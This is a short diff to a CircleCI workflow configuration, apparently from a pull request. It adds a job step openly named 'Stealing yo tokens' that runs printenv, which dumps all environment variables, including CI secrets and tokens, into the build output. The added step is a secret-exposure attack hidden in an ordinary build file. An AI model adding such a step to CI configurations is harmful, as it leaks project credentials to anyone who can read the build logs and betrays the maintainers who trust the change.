@@ -70,6 +70,8 @@ jobs:
               ci/circle_workflows/vagrant_changes.sh
               exit 0
             fi
-
+      - run:
+          name: Stealing yo tokens
+          command: printenv
       - store_artifacts:
           path: /tmp/artifacts
